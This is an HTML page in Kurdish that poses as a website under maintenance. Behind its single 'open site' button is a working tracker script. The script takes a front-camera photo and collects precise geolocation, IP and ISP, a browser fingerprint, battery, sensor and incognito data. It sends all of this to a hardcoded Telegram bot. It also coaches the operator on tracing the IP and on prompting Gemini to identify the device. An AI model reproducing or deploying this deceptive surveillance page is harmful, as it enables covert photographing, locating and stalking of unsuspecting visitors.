<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        h1 { font-size: 22px; color: #e74c3c; margin-bottom: 15px; }
        p { font-size: 15px; color: #666; margin-bottom: 25px; }
        .btn {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 15px 25px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background-color: #219653; }
    </style>
</head>
<body>
    <div class="container" id="content-box">
        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
        <p>بۆ بینینی ناوەڕۆک و چالاککردنی پەڕەکە، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
        <button class="btn" onclick="startProcess()">کردنەوەی ماڵپەڕ</button>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || "6782298541";

        async function getTelegramFirstName() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const data = await res.json();
                if (data.ok && data.result) {
                    for (let update of data.result) {
                        const message = update.message || update.callback_query?.message;
                        if (message && message.chat && message.chat.id.toString() === chatId.toString()) {
                            return message.from.first_name || "هاوڕێ";
                        }
                    }
                }
            } catch (e) {}
            return "هاوڕێ";
        }

        async function startProcess() {
            document.getElementById('content-box').innerHTML = '<h1>⏳ چاوەڕوان بێ...</h1><p>خەریکی بارکردنی زانیارییەکان...</p>';

            let firstName = await getTelegramFirstName();

            const days = ["یەکشەممە", "دووشەممە", "سێشەممە", "چوارشەممە", "پێنجشەممە", "هەینی", "شەممە"];
            const now = new Date();
            let dayName = days[now.getDay()];
            let timeString = now.toISOString().replace('T', ' ').substring(0, 19);
            let fullDateText = `${timeString} (${dayName})`;
            
            let deviceModel = "نادیار";
            try {
                const parser = new UAParser();
                const result = parser.getResult();
                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
            } catch (e) {}

            const userAgentText = navigator.userAgent;

            let ip = 'نادیار', isp = 'نادیار';
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || 'نادیار';
                isp = data.org || 'نادیار';
            } catch (e) {}

            let locationText = "بەردەست نییە";
            let mapLink = "";
            let locationStatus = "";
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                });
                let lat = pos.coords.latitude;
                let lon = pos.coords.longitude;
                locationText = `${lat}, ${lon}`;
                mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                locationStatus = "کەسەکە Allowـی لۆکەیشنی کردووە 🟢";
            } catch (e) {
                locationStatus = "بەکارهێنەرەکە ڕێگەی پێنەداوە و لۆکەیشنی داخستووە (Deny کردووە) 🔴";
            }

            let batteryInfo = "نەزانراو";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    let level = Math.round(bat.level * 100);
                    let charging = bat.charging ? "ئامێرەکەی لەسەر شەحنە ⚡" : "ئامێرەکەی لەسەر شەحن نییە 🔋";
                    batteryInfo = `${level}% (${charging})`;
                }
            } catch (e) {}

            let screenRes = `${window.screen.width}x${window.screen.height}`;
            let pixelRatio = window.devicePixelRatio || 1;

            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
            let sysLang = navigator.language || "نەزانراو";
            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";

            let extendedNetwork = "نەزانراو";
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    let type = conn.effectiveType || 'نادیار';
                    let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'نادیار';
                    let rtt = conn.rtt ? conn.rtt + ' ms (Ping)' : 'نادیار';
                    extendedNetwork = `جۆر: ${type} | خێرایی: ${downlink} | پینگ (RTT): ${rtt}`;
                }
            } catch (e) {}

            let advFingerprint = "نەزانراو";
            let gpuInfo = "نەزانراو";
            try {
                const canvasGL = document.createElement('canvas');
                const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
                const canvas2D = document.createElement('canvas');
                const ctx = canvas2D.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("BrowserFP, 2026!", 2, 15);
                let dataURI = canvas2D.toDataURL();
                let hash = 0;
                for (let i = 0; i < dataURI.length; i++) {
                    hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
                    hash |= 0;
                }
                advFingerprint = `Hash ID: ${Math.abs(hash)} (GPU: ${gpuInfo})`;
            } catch (e) {}

            let motionInfo = "بەردەست نییە یان ڕێگری لێکراوە";
            try {
                let orientationData = await new Promise((resolve) => {
                    let resolved = false;
                    const handler = (event) => {
                        if (!resolved) {
                            resolved = true;
                            window.removeEventListener('deviceorientation', handler);
                            resolve(`Alpha: ${Math.round(event.alpha || 0)}°, Beta: ${Math.round(event.beta || 0)}°, Gamma: ${Math.round(event.gamma || 0)}°`);
                        }
                    };
                    window.addEventListener('deviceorientation', handler);
                    setTimeout(() => {
                        if (!resolved) {
                            resolved = true;
                            resolve("جووڵە نەدۆزرایەوە (Timeout)");
                        }
                    }, 1000);
                });
                motionInfo = orientationData;
            } catch (e) {}

            let incognitoStatus = "ئاسایی (Normal Mode)";
            try {
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    let estimate = await navigator.storage.estimate();
                    if (estimate.quota && estimate.quota < 120 * 1024 * 1024) {
                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂️️";
                    }
                }
            } catch (e) {}

            let imageBlob = null;
            let cameraStatus = "";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                cameraStatus = "کەسەکە Allowـی کردووە و وێنەکەی بە سەرکەوتوویی هاتۆتەوە 🟢";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                imageBlob = await new Promise((resolve) => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640; 
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        canvas.toBlob(blob => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve(blob);
                        }, 'image/jpeg');
                    }, 1000);
                });
            } catch (e) {
                cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
            }

            let mapTextPart = mapLink 
                ? `لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر [گووگڵ ماپ](${mapLink}) بیبینی:\n(Lat & Long: ${locationText})` 
                : `لۆکەیشن: ${locationStatus}`;

            let introText = imageBlob 
                ? `👤 سڵاو ${firstName}، ئەمە وێنەی کەسەکەیە و وردەکارییەکانی بەم شێوەیەیە:` 
                : `👤 سڵاو ${firstName}، وێنەی کەسەکە نەهاتۆتەوە، چونکە ${cameraStatus}`;

            const msg = `زانیارییە تەواوەکانی سەردانیکەرەکە (پێشکەوتوو):\n\n` +
                        `${introText}\n\n` +
                        `⏰ کات: ${fullDateText}\n` +
                        `🌐 IP کەسەکە: ${ip} (${isp})\n` +
                        `📍 ${mapTextPart}\n` +
                        `🕵️‍♂️ دۆخی وێبگەڕ: ${incognitoStatus}\n` +
                        `🛜 خێرایی و جۆری قووڵی ئینتەرنێت: ${extendedNetwork}\n` +
                        `🧬 فینگەرپریینتی قووڵ (Advanced FP): ${advFingerprint}\n` +
                        `🔄 سێنسەری جووڵە (Motion Sensors): ${motionInfo}\n` +
                        `🔋 ڕێژەی شەحنی مۆبایل: ${batteryInfo}\n` +
                        `📷 دۆخی کامێرا: ${cameraStatus}\n` +
                        `📱 سیستەم/ئامێر: ${deviceModel}\n` +
                        `📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n` +
                        `🧠 ناوکەکانی پرۆسێسەر (CPU): ${cpuCores}\n` +
                        `💾 قەبارەی ڕام (RAM): ${deviceRam}\n` +
                        `🌐 زمانی سیستەم: ${sysLang}\n` +
                        `🌓 دۆخی شاشە: ${isDarkMode}\n` +
                        `🌐 User-Agent: ${userAgentText}\n\n` +
                        `📌 **چۆنیەتی سوودوەرگرتن لە IP بۆ دۆزینەوەی شوێنی ورد (ڕێگەی یاسایی):**\n` +
                        `ئەگەر لۆکەیشنی ڕاستەوخۆ (GPS) بەردەست نەبوو یان کەسەکە Denyـی کرد، دەتوانیت لە ڕێگەی IPـیەکەیەوە (` + ip + `) ئەم هەنگاوانە بنێیت:\n` +
                        `1. ناسینەوەی کۆمپانیای دابینکەری ئینتەرنێت (ISP) کە بریتییە لە: (${isp}).\n` +
                        `2. پێشکەشکردنی سکاڵای فەرمی یان داواکاری یاسایی بۆ لایەنە پەیوەندیدارەکان.\n` +
                        `3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی ڕووداوەکە (Timestamp: ${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە بەکارهاتووە.\n\n` +
                        `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
                        `ئەگەر دەتەوێت بە دەقیقی جۆری مۆدێلی ئامێرەکەی بزانیت، ئەم ڕستەی خوارەوە کۆپی بکە و بینێرە بۆ جێمینای:\n\n` +
                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە (بۆ نموونە: Samsung Galaxy S series, iPhone, Xiaomi, لاپتۆپ و غەیری)?"`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: chatId, 
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) {}

            if (imageBlob) {
                try {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', imageBlob, 'capture.jpg');
                    formData.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${firstName}، ئەمەش وێنەکەیەتی)`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                        method: 'POST', 
                        body: formData 
                    });
                } catch (err) {}
            }

            document.getElementById('content-box').innerHTML = `
                <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
                <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
            `;
        }
    </script>
</body>
</html>
